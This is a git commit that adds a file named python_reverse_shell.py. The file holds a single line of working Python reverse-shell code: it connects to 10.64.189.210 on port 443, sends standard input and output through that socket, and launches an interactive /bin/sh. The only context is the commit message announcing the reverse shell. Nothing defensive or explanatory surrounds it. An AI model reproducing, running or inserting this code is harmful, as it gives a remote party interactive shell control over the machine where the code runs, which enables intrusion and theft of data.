49e0a213181841d1bf2e0a90085acecac589f0ce
davidoberst <juandavidbustosperez82@gmail.com>
2026-05-25 10:43:28 -0500

    Add reverse shell implementation in python

---
+++ python_reverse_shell.py
@@ -0,0 +1,1 @@
+import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.64.189.210",443));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"])
